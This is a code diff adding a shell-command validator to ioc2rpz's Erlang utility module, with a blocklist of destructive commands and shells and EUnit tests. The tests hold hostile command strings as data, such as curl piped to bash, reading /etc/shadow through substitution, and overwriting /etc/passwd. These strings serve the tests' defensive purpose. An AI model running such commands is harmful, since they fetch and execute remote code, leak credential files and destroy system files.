@@ -19,7 +19,7 @@
 -include_lib("ioc2rpz.hrl").
 -export([logMessage/2,logMessageCEF/2,strs_to_binary/1,curr_serial/0,curr_serial_60/0,constr_ixfr_url/3,ip_to_bin/1,read_local_actions/1,split_bin_bytes/2,split_tail/2,rsplit_tail/2,
          bin_to_lowcase/1,ip_in_list/2,intersection/2,bin_to_hexstr/1,conv_to_Mb/1,q_class/1,q_type/1,split/2,msg_CEF/1,base64url_decode/1,get_cipher_suites/1,
-         str_to_ip/1,check_rate_limit/1,check_rate_limit/2,cleanup_rate_limit_table/0,constant_time_compare/2,json_escape/1]).
+         str_to_ip/1,check_rate_limit/1,check_rate_limit/2,cleanup_rate_limit_table/0,constant_time_compare/2,json_escape/1,validate_shell_cmd/1]).
 
 %% @doc Logs a formatted message to the group leader with a timestamp prefix.
 %% Delegates to {@link logMessage/3} using `group_leader()' as the destination.
@@ -117,6 +117,9 @@ msg_CEF(301)    -> "|000301|MGMT request denied|7|src=~s spt=~p proto=~p qname=~
 msg_CEF(429)    -> "|000429|Too many requests|7|src=~s spt=~p proto=~p qname=~p qtype=~p qclass=~p~n";
 
 msg_CEF(501)    -> "|000501|Possible DDoS CVE-2004-0789|37|src=~s spt=~p proto=~p~n";
+
+msg_CEF(150)    -> "|000150|Shell source command executed|3|cmd=~s~n";
+msg_CEF(151)    -> "|000151|Shell source command rejected|7|cmd=~s reason=~p~n";
 
 msg_CEF(_)    -> "Not defined~n".
 
@@ -573,6 +576,125 @@ json_escape_char($\r) -> "\\r";
 json_escape_char(C) when is_integer(C), C < 16#20 -> lists:flatten(io_lib:format("\\u~4.16.0b", [C]));
 json_escape_char(C) -> C.
 
+%% @doc Validates a `shell:' source command before it is passed to `os:cmd/1'.
+%%
+%% Security hardening (task 11). The command is split into pipeline segments on
+%% unquoted `|' (quote-aware: a `|' or `\|' inside single/double quotes is not a
+%% separator), and each segment's executable (first token) must be EITHER an
+%% absolute path (starts with `/') OR the bare basename of a safe text-processing
+%% utility on the allowlist. The basename of every executable (absolute or bare)
+%% is additionally checked against a blocklist of destructive commands and
+%% general-purpose shells, so the allowlist can never re-admit a blocked command.
+%% Command substitution (backticks, `$(') and output redirection (unquoted `>'
+%% / `>>') are rejected. Pipes, quotes, parentheses inside awk/sed expressions,
+%% `&' inside quoted URLs, etc. are allowed since they are essential for real
+%% feed pipelines.
+%%
+%% @param CMD The shell command binary (the part after the `shell:' prefix).
+%% @returns `{ok, CMD}' if the command is allowed, or `{error, Reason}' otherwise.
+-spec validate_shell_cmd(binary()) -> {ok, binary()} | {error, term()}.
+validate_shell_cmd(CMD) when is_binary(CMD) ->
+  case scan_shell_cmd(binary_to_list(CMD), none, [], []) of
+    {error, Reason} -> {error, Reason};
+    {ok, Segments}  ->
+      case validate_shell_segments(Segments) of
+        ok          -> {ok, CMD};
+        {error, R}  -> {error, R}
+      end
+  end.
+
+%% @doc Blocklist of destructive commands / shells, matched by basename.
+shell_blocked_cmds() ->
+  ["rm","mkfs","dd","chmod","chown","shutdown","reboot","kill","killall",
+   "mv","eval","exec","source","bash","sh","zsh","csh","ksh"].
+
+%% @doc Allowlist of safe text-processing utilities that may be invoked by bare
+%% name (without an absolute path), matched by basename.
+shell_safe_utils() ->
+  ["sort","uniq","grep","egrep","fgrep","sed","awk","gawk","cut","tr",
+   "head","tail","cat","comm","wc","tee"].
+
+%% @doc Quote-aware scanner. Splits the command into pipeline segments on
+%% unquoted `|' and rejects command substitution / output redirection.
+%% State is `none' (unquoted), `single' (inside '...') or `double' (inside "...").
+scan_shell_cmd([], none, CurSeg, Segs) ->
+  {ok, lists:reverse([lists:reverse(CurSeg) | Segs])};
+scan_shell_cmd([], _Quoted, _CurSeg, _Segs) ->
+  {error, unbalanced_quotes};
+%% --- inside single quotes: everything literal until the closing quote ---
+scan_shell_cmd([$' | Rest], single, CurSeg, Segs) ->
+  scan_shell_cmd(Rest, none, [$' | CurSeg], Segs);
+scan_shell_cmd([C | Rest], single, CurSeg, Segs) ->
+  scan_shell_cmd(Rest, single, [C | CurSeg], Segs);
+%% --- inside double quotes: backslash escapes; subst rejected; quote ends ---
+scan_shell_cmd([$\\, C | Rest], double, CurSeg, Segs) ->
+  scan_shell_cmd(Rest, double, [C, $\\ | CurSeg], Segs);
+scan_shell_cmd([$` | _Rest], double, _CurSeg, _Segs) ->
+  {error, command_substitution};
+scan_shell_cmd([$$, $( | _Rest], double, _CurSeg, _Segs) ->
+  {error, command_substitution};
+scan_shell_cmd([$" | Rest], double, CurSeg, Segs) ->
+  scan_shell_cmd(Rest, none, [$" | CurSeg], Segs);
+scan_shell_cmd([C | Rest], double, CurSeg, Segs) ->
+  scan_shell_cmd(Rest, double, [C | CurSeg], Segs);
+%% --- unquoted ---
+scan_shell_cmd([$\\, C | Rest], none, CurSeg, Segs) ->
+  scan_shell_cmd(Rest, none, [C, $\\ | CurSeg], Segs);
+scan_shell_cmd([$\\], none, _CurSeg, _Segs) ->
+  {error, trailing_backslash};
+scan_shell_cmd([$' | Rest], none, CurSeg, Segs) ->
+  scan_shell_cmd(Rest, single, [$' | CurSeg], Segs);
+scan_shell_cmd([$" | Rest], none, CurSeg, Segs) ->
+  scan_shell_cmd(Rest, double, [$" | CurSeg], Segs);
+scan_shell_cmd([$` | _Rest], none, _CurSeg, _Segs) ->
+  {error, command_substitution};
+scan_shell_cmd([$$, $( | _Rest], none, _CurSeg, _Segs) ->
+  {error, command_substitution};
+scan_shell_cmd([$> | _Rest], none, _CurSeg, _Segs) ->
+  {error, output_redirection};
+scan_shell_cmd([$| | Rest], none, CurSeg, Segs) ->
+  scan_shell_cmd(Rest, none, [], [lists:reverse(CurSeg) | Segs]);
+scan_shell_cmd([C | Rest], none, CurSeg, Segs) ->
+  scan_shell_cmd(Rest, none, [C | CurSeg], Segs).
+
+%% @doc Validates every pipeline segment's executable.
+validate_shell_segments([]) ->
+  {error, empty_command};
+validate_shell_segments(Segments) ->
+  validate_shell_segments_1(Segments).
+
+validate_shell_segments_1([]) ->
+  ok;
+validate_shell_segments_1([Seg | Rest]) ->
+  case string:trim(Seg) of
+    "" -> {error, empty_segment};
+    Trimmed ->
+      Exe = case string:lexemes(Trimmed, " \t") of
+              [T | _] -> T;
+              []      -> ""
+            end,
+      case validate_shell_executable(Exe) of
+        ok         -> validate_shell_segments_1(Rest);
+        {error, R} -> {error, R}
+      end
+  end.
+
+%% @doc Validates a single executable token against the blocklist/allowlist.
+validate_shell_executable(Exe) ->
+  Base = filename:basename(Exe),
+  case lists:member(Base, shell_blocked_cmds()) of
+    true  -> {error, {blocked_command, Base}};
+    false ->
+      case Exe of
+        [$/ | _] -> ok; %% absolute path, not blocklisted
+        _ ->
+          case lists:member(Base, shell_safe_utils()) of
+            true  -> ok; %% bare-name safe utility
+            false -> {error, {executable_not_absolute, Exe}}
+          end
+      end
+  end.
+
 %%%%
 %%%% EUnit tests
 %%%%
@@ -661,4 +783,28 @@ constant_time_compare_test() -> [
 	?assert(constant_time_compare(<<"hi">>, <<"hello">>) =:= false),
 	?assert(constant_time_compare(<<"hello">>, <<"hi">>) =:= false),
 	?assert(constant_time_compare(<<>>, <<"a">>) =:= false)
+].
+
+validate_shell_cmd_test() -> [
+	%% --- valid real-world pipelines (absolute paths + bare-name safe utilities) ---
+	?assertMatch({ok, _}, validate_shell_cmd(<<"/usr/bin/curl -sL http://example.com/feed.csv | /usr/bin/gawk 'match($0,/p/,a) {print a[1]}' | sort | uniq | grep '^[a-z]*$'">>)),
+	?assertMatch({ok, _}, validate_shell_cmd(<<"/usr/bin/curl -sL https://example.com/r.md | /bin/grep 'sdns://' | /usr/bin/php /opt/ioc2rpz/cfg/decoder.php">>)),
+	?assertMatch({ok, _}, validate_shell_cmd(<<"/usr/bin/curl -s --compressed https://example.com/hosts">>)),
+	?assertMatch({ok, _}, validate_shell_cmd(<<"/usr/bin/curl -s -u 'user:pass' https://example.com/feed.csv">>)),
+	?assertMatch({ok, _}, validate_shell_cmd(<<"/usr/bin/curl -sL 'https://u:p@api.example.com:8000/api/data&field=ip' | gawk -F '[.,]' --non-decimal-data '{ printf \"::ffff:%x%0.2x\\n\", $1, $2 }'">>)),
+	?assertMatch({ok, _}, validate_shell_cmd(<<"/usr/bin/curl -s https://example.com/feed.csv | sed 's/[][\"]//g' | grep -v 'type,indicator' | grep 'domain,\\|ipv4,' | awk -F',' '{print $2}'">>)),
+	%% leading space after shell: prefix
+	?assertMatch({ok, _}, validate_shell_cmd(<<" /usr/bin/curl -s https://example.com/hosts">>)),
+	%% --- rejected: relative / non-allowlisted executables ---
+	?assertMatch({error, {executable_not_absolute, _}}, validate_shell_cmd(<<"curl -sL http://example.com | gawk '{print}'">>)),
+	?assertMatch({error, {executable_not_absolute, _}}, validate_shell_cmd(<<"php /opt/x.php">>)),
+	?assertMatch({error, {executable_not_absolute, _}}, validate_shell_cmd(<<"wget http://example.com">>)),
+	%% --- rejected: destructive / shell commands (even with absolute paths) ---
+	?assertMatch({error, {blocked_command, "rm"}}, validate_shell_cmd(<<"/bin/rm -rf /tmp/data">>)),
+	?assertMatch({error, {blocked_command, "bash"}}, validate_shell_cmd(<<"/usr/bin/curl http://example.com | /bin/bash">>)),
+	?assertMatch({error, {blocked_command, "sh"}}, validate_shell_cmd(<<"/usr/bin/curl http://example.com | /bin/sh -c 'cat /etc/shadow'">>)),
+	%% --- rejected: command substitution and output redirection ---
+	?assertMatch({error, command_substitution}, validate_shell_cmd(<<"/usr/bin/curl http://example.com/$(cat /etc/shadow)">>)),
+	?assertMatch({error, command_substitution}, validate_shell_cmd(<<"/usr/bin/curl `cat /etc/shadow`">>)),
+	?assertMatch({error, output_redirection}, validate_shell_cmd(<<"/usr/bin/curl http://example.com > /etc/passwd">>))
 ].
